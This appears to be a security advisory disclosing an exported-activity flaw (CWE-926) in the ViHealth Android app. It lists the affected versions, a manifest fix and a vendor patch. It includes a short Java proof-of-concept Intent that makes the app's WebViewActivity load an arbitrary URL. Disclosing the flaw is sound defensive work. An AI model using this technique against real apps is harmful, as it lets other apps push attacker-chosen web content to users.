

Vendor of Product: Viatom Health                                                                                                                                                                                                                                                                                                                                                                      
Vulnerability Type: CWE-926: Improper Export of Android Application Components

Affected Product:  ViHealth Android App V. 2.74.58* & earlier

Affected Component: Exported Activity "com.viatom.baselib.mvvm.web.WebViewActivity"

Attack Type: Adjacent

To exploit the vulnerability, the attacker needs to have a victim install a 3rd party Android app on their device

The Android application exports a component for use by other applications but does not properly restrict which applications can launch the component or access the data it contains.

See https://cwe.mitre.org/data/definitions/926.html

This issue can be mitigated by changing exported status of the activity reflected on the AndroidManifest.xml entry:

![image](https://github.com/actuator/cve/assets/78701239/6d9c2530-0122-4ea6-871a-72fd6c1ad08b)



An attacker could craft a 3rd party app using the following code to load the URL of their choice to facilitate malicious actions:



********************************************************************************************************************************

Intent launch = new Intent();
launch.setClassName("com.viatom.vihealth", "com.viatom.baselib.mvvm.web.WebViewActivity");

// Put the URL to be loaded in the WebViewActivity
launch.putExtra("web_url", "https://www.windows93.net");

// Start the activity
startActivity(launch);

********************************************************************************************************************************


![com viatom baselib mvvm web WebViewActivity](https://github.com/actuator/cve/assets/78701239/2dafcbb9-e528-4103-881e-173655970e37)


**This issue has been fixed today (6/19/23) with version (2.74.62)-shortly after I reported it to the vendor on 6/10/23.


![image](https://github.com/actuator/cve/assets/78701239/00fe68ca-6030-4eac-a84b-188c0036b5d8)


![image](https://github.com/actuator/cve/assets/78701239/4c2b98e8-2407-4325-bc96-8de0dae71443)


Discoverer: Edward Warren
